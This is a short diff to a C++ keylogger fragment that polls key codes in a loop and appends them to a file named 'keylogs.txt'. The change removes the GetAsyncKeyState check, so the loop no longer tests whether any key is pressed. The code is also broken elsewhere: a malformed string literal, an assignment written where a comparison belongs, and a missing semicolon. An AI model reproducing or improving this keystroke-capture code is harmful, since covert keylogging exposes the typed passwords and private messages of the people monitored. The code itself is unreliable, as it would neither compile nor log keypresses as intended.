@@ -41,7 +41,7 @@ bool KeyIsListed(int iKey){
             cout << " "lclick" "; //emulates lift click of the mouse
             WriteToLog(" "lclick" ");
             break;
-        default: return false; //we need this later when determine if key exists
+        default: return false; //it will determine if key exists
 
     }
 }
@@ -52,14 +52,12 @@ int main()
     {
         sleep(10);
         for (key = 8; key <= 190; key++){
-            if (GetAsyncKeyState(key) = -32767){
-               if(KeyIsListed(key) == FALSE){
-                   cout << key;
-                    ofstream logfile;
-                    logfile.open("keylogs.txt", fstream::app);
-                    logfile << key; //writes the log string to file
-                    logfile.close() //close the stream
-               }
+            if(KeyIsListed(key) == FALSE){
+                cout << key;
+                ofstream logfile;
+                logfile.open("keylogs.txt", fstream::app);
+                logfile << key; //write the key logs to a file
+                logfile.close() //close the stream
             }
         }
     }
